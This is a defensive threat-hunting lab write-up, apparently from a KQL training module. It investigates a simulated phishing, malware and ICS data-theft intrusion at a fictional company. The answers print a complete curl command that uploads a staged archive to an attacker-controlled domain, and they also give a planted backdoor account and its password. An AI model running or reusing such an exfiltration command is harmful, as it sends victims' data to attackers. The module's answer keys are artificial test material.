# Solvi Systems — Supply Chain Attack & ICS Targeting

**Module:** Security Analyst II | **Environment:** Solvi Systems  
**Status:** ✅ Complete | **Queries:** 27  
**Attack Type:** Web Recon → Spearphishing → Malware Implant → C2 Persistence → Lateral Movement → ICS Data Exfiltration

---

## Module Overview

A sophisticated supply chain and ICS (Industrial Control Systems) targeting investigation at Solvi Systems. Threat actors performed extensive web reconnaissance, then delivered a malicious document to a Customer Support Specialist. The implanted `ecobug.exe` established C2 persistence across 38+ machines. Attackers then moved laterally to a Docks Customer Success Manager's machine to steal ICS software documentation and exfiltrate it via curl.

**Tables Used:** `Employees`, `Email`, `InboundNetworkEvents`, `OutboundNetworkEvents`, `PassiveDns`, `ProcessEvents`, `FileCreationEvents`, `NetworkFlow`

---

## Attack Chain Summary

```
Threat Actor reconnaissance (Opera/8.64 UA | 105.78.23.64)
  └─ 64 requests to solvisystems.com | researching "docks-ics" product
       └─ 3 attacker domains: energy-trends4u.net, news-on-industry.com, eco-awareness-update.net
            └─ 56 phishing emails → 5 roles targeted
                 └─ Carla Wharton (Customer Support) clicked malicious docx link
                      └─ ecobug.exe dropped → C2 to 98.117.26.236:1337
                           └─ 39 machines infected | 470 total C2 connections
                                └─ Lateral movement: SJ9V-MACHINE (Alexei Petrov)
                                     └─ net use /PERSISTENT:YES | SoftwareDev docs copied
                                          └─ CollectedData.zip → curl exfil to eco-awareness-update.net
```

---

## Queries

---

### Q01 — Employee Count

```kql
// Total headcount at Solvi Systems
Employees
| count
```

---

### Q02 — CTO Profile

```kql
// Identify the CTO
Employees
| where role == "CTO"
```

**Answer:** Alexis Khoza | Email: `alexis_khoza@solvisystems.com` | IP: `10.10.0.7`

---

### Q03 — Email Volume Check

```kql
// How many emails did Alexis Khoza receive?
Email
| where recipient == "alexis_khoza@solvisystems.com"
| count
```

**Answer:** 31 emails.

---

### Q04 — Vendor Domain Email Volume

```kql
// Emails from eskom.co.za (vendor domain check)
Email
| where sender has "eskom.co.za"
| distinct sender
| count
```

**Answer:** 745 distinct senders from that domain.

---

### Q05 — CTO Web Activity

```kql
// How many distinct websites did Alexis Khoza visit?
OutboundNetworkEvents
| where src_ip == "10.10.0.7"
| distinct url
| count
```

**Answer:** 72 distinct URLs.

---

### Q06 — PassiveDns Enumeration

```kql
// How many domains contain the word "real"?
PassiveDns
| where domain contains "real"
| distinct domain
| count
```

**Answer:** 19 domains.

---

### Q07 — Domain Resolution Lookup

```kql
// What IPs does bit.ly resolve to?
PassiveDns
| where domain == "bit.ly"
| distinct ip
```

**Answer:** One of the IPs: `181.216.241.104`

---

### Q08 — Web Application Attack Discovery

```kql
// Detect XSS probing against Solvi Systems web app
InboundNetworkEvents
| where url contains "alert"
```

**Answer:** Attacker tested `alert('xss')`. Response code: `404`. User-Agent: `Opera/8.64`. Timestamp: `2024-05-03`.

> **MITRE:** T1190 — Exploit Public-Facing Application

---

### Q09 — Scope of Attacker Probing

```kql
// Total malicious requests from the Opera/8.64 user agent in the attack window
InboundNetworkEvents
| where user_agent contains "Opera/8.64"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
```

**Answer:** 9 malicious requests in the 2-day window.

---

### Q10 — Full Reconnaissance Scope

```kql
// All inbound requests from the attacker's IP across the full timeline
let mal_ips =
InboundNetworkEvents
| where user_agent contains "Opera/8.64"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (mal_ips)
| where url contains "solvisystems"
```

**Answer:** 64 total requests. First request: `2024-05-01T00:00:00Z`. Researched product: `docks-ics`.

> **SOC Context:** 15 days of reconnaissance before the phishing campaign launched. Attackers were specifically profiling the ICS/DOCKS product line — a targeted supply chain attack.

---

### Q11 — Threat Actor Infrastructure Pivot

```kql
// What domains do the attacker's IPs resolve to?
let mal_ips =
InboundNetworkEvents
| where user_agent contains "Opera/8.64"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
| distinct src_ip;
PassiveDns
| where ip in (mal_ips)
| distinct domain
```

**Answer:** 3 attacker domains:
- `energy-trends4u.net`
- `news-on-industry.com`
- `eco-awareness-update.net`

> **MITRE:** T1583 — Acquire Infrastructure (attacker registered energy-sector themed domains)

---

### Q12 — Phishing Campaign Scope

```kql
// How many Solvi Systems employees received phishing emails from these domains?
Email
| where link has_any("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| distinct recipient
```

**Answer:** 56 distinct recipients. 3 distinct senders. 3 distinct malicious filenames.

---

### Q13 — Roles Targeted

```kql
// Which employee roles were targeted in the phishing campaign?
let mal_recipients =
Email
| where link has_any("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| distinct recipient;
Employees
| where email_addr in (mal_recipients)
| distinct role
```

**Answer:** 5 roles targeted. **Customer Support Specialist** had the most recipients (27).

> **MITRE:** T1566.002 — Spearphishing Link (broad targeting of a specific role)

---

### Q14 — First Phishing Email

```kql
// When was the first phishing email sent? Who was targeted?
Email
| where link has_any("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
```

**Answer:** `2024-05-01T15:51:41Z`
- Recipient: `carla_wharton@solvisystems.com`
- Sender: `news@eco-awareness-updates.net`
- Reply-to: `electric_updates@gmail.com`
- Subject: `[EXTERNAL] Business Opportunity: Two major energy companies merging`
- Link: `http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx`

---

### Q15 — Victim Clicked Phishing Link

```kql
// Confirm Carla clicked the link and when
Employees
| where email_addr == "carla_wharton@solvisystems.com"
// IP: 10.10.0.164 | Host: JUSP-LAPTOP

OutboundNetworkEvents
| where src_ip == "10.10.0.164" and url == "http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx"
```

**Answer:** Carla clicked at `2024-05-01T15:57:41Z` — 6 minutes after receiving the email.

---

### Q16 — Malware Dropper Identified

```kql
// What file appeared on Carla's machine shortly after she opened the docx?
FileCreationEvents
| where hostname == "JUSP-LAPTOP"
```

**Answer:** `ecobug.exe` — SHA256: `1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252`

> **MITRE:** T1204.002 — Malicious File execution

---

### Q17 — Malware Infection Scope

```kql
// How many Solvi Systems machines have ecobug.exe?
FileCreationEvents
| where filename == "ecobug.exe"
| count
```

**Answer:** 39 machines infected.

---

### Q18 — C2 Beacon Destination

```kql
// What IP does ecobug.exe beacon to?
ProcessEvents
| where hostname == "JUSP-LAPTOP"
| where process_commandline contains "ecobug.exe"
```

**Answer:** C2 IP `98.117.26.236` on **port 1337**

> **MITRE:** T1071 — Application Layer Protocol | T1219 — Remote Access Software

---

### Q19 — C2 Connection Frequency

```kql
// How many times did Carla's machine connect to the C2?
NetworkFlow
| where src_ip == "10.10.0.164" and dest_ip == "98.117.26.236"
| distinct timestamp
```

**Answer:** 24 connections. Beaconing at `17:38:25` daily — **recurring connection interval of 1** (consistent beacon = automated C2 heartbeat).

---

### Q20 — Enterprise-Wide C2 Connections

```kql
// Total C2 connections across all Solvi Systems machines
let employee_ip =
Employees
| distinct ip_addr;
NetworkFlow
| where src_ip in (employee_ip) and dest_ip == "98.117.26.236"
```

**Answer:** 470 total connections from 38 distinct employee machines.

---

### Q21 — Post-Compromise Discovery Commands

```kql
// What commands did the attacker run after gaining access?
ProcessEvents
| where timestamp >= datetime(2024-05-02T16:25:20.000Z)
| where hostname == "JUSP-LAPTOP"
| where process_commandline has "net"
    or process_commandline has "whoami"
    or process_commandline has "ipconfig"
    or process_commandline has "systeminfo"
```

**Key commands:**
- New user created: `gu@rd!an` (password: `abc1toothree`)
- Discovery: `ipconfig /all`
- Last discovery: `net use`

> **MITRE:** T1136 — Create Account | T1082 — System Information Discovery | T1033 — System Owner/User Discovery

---

### Q22 — Lateral Movement via Network Shares

```kql
// How many distinct "net use" commands across all Solvi Systems devices?
ProcessEvents
| where process_commandline contains "net use"
| distinct process_commandline
| count

// Specifically the persistent mount command
ProcessEvents
| where process_commandline has "net use"
| distinct process_commandline
```

**Answer:** 2 unique `net use` commands. Key one: `net use /PERSISTENT:YES`

> **MITRE:** T1021.002 — SMB/Windows Admin Shares

---

### Q23 — Persistence via Persistent Network Share

```kql
// Which hosts ran the persistent mount command? Who owns them?
ProcessEvents
| where process_commandline has "net use /PERSISTENT:YES"

Employees
| where username == "alpetrov"
```

**Answer:** 3 hosts. Key host: `SJ9V-MACHINE` at `2024-05-27T16:23:10Z`.
- Employee: **Alexei Petrov** | Role: Docks Customer Success Manager
- Email: `alexei_petrov@solvisystems.com`

> **SOC Context:** A Docks Customer Success Manager is the perfect lateral movement target — they have legitimate access to ICS/DOCKS documentation.

---

### Q24 — Data Staging

```kql
// What command copied SoftwareDevelopment files?
ProcessEvents
| where process_commandline contains "SoftwareDevelopment" and hostname == "SJ9V-MACHINE"

// What archive was created?
ProcessEvents
| where timestamp >= datetime(2024-05-27T17:11:58.000Z) and hostname == "SJ9V-MACHINE"
```

**Answer:** Files copied, then archived as `CollectedData.zip`

> **MITRE:** T1560 — Archive Collected Data | T1570 — Lateral Tool Transfer

---

### Q25 — Internal Portal Reconnaissance

```kql
// What internal portal did attackers browse via Alexei's machine?
InboundNetworkEvents
| where url contains ".solvisystems.com"
```

**Answer:** `devportal.solvisystems.com` — attackers read an internal process document about ICS software documentation storage.

---

### Q26 — Exfiltration Command

```kql
// Full curl exfiltration command used
ProcessEvents
| where hostname == "SJ9V-MACHINE"
```

**Answer:**
```
curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
```

> **MITRE:** T1567 — Exfiltration Over Web Service | T1071 — Application Layer Protocol

---

### Q27 — Phishing from Compromised Internal Account

```kql
// Emails sent by Alexei Petrov (compromised) to colleagues
Email
| where sender contains "alexei_petrov@solvisystems.com"
```

**Subject:** `Do you know where the DOCKS software documentation is stored? 🤪`

> **MITRE:** T1534 — Internal Spearphishing (using compromised internal account to pivot further)

---

## MITRE ATT&CK Coverage

| Tactic | ID | Technique | Query |
|---|---|---|---|
| Reconnaissance | T1590 | Gather Victim Network Info | Q08–Q10 |
| Reconnaissance | T1595 | Active Scanning | Q08, Q09 |
| Resource Development | T1583 | Acquire Infrastructure | Q11 |
| Initial Access | T1190 | Exploit Public-Facing Application | Q08 |
| Initial Access | T1566.002 | Spearphishing Link | Q12–Q15 |
| Execution | T1204.002 | Malicious File | Q15, Q16 |
| Persistence | T1136 | Create Account | Q21 |
| Defence Evasion | T1036 | Masquerading (ecobug as legitimate) | Q16 |
| Discovery | T1082 | System Information Discovery | Q21 |
| Discovery | T1033 | System Owner/User Discovery | Q21 |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | Q22, Q23 |
| Lateral Movement | T1534 | Internal Spearphishing | Q27 |
| Collection | T1560 | Archive Collected Data | Q24 |
| Command & Control | T1071 | Application Layer Protocol | Q18, Q19 |
| Exfiltration | T1567 | Exfiltration Over Web Service | Q26 |
